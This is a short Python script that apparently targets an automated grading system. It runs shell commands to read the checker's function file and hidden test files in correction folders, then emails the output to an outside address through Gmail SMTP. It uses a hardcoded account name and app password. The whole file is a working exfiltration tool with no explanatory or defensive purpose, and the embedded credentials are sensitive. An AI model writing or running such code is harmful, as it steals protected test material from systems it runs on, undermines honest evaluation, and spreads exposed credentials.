#!/usr/bin/python3
import subprocess
from sys import argv
import smtplib
def send_data(message="no_data"):
    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    # start TLS for security
    s.starttls()
    # Authentication
    s.login("ashrafalx368@gmail.com", "qjra ywyu vjzy yves")
    # sending the mail
    s.sendmail("ashrafalx368@gmail.com", "ashrafatef368@gmail.com", message)
    # terminating the session
    s.quit()
def get_data(command):
    # Specify the shell command you want to run
    shell_command = command
    # Run the command and capture the output
    result = subprocess.run(shell_command, shell=True, stdout=subprocess.PIPE, text=True)
    # Check if the command was successful
    if result.returncode == 0:
        # Access the output using result.stdout
        output = result.stdout
        output = output
        return output
    else:
        print(f"Error: Command '{shell_command}' failed with return code {result.returncode}")

with open(argv[1], "r") as f:
    # my_data = get_data("zip -r myarch.zip ../../../*")
    # my_data += get_data("ls -l")
    # my_data += get_data("pwd")
    my_data = get_data("cat ../../../hbtn_checker_functions") or "f"
    my_data += get_data("ls -l ../../../") or ""
    my_data += get_data("ls -al ../../../corrections_*/") or ""
    my_data += get_data("ls -l ../../../corrections_*/corrections/262/1397") or ""
    my_data += "\n#######################\n"
    my_data += get_data("cat ../../../corrections_*/corrections/262/1397/test0") or ""
    my_data += get_data("pwd") or ""
    send_data(my_data)
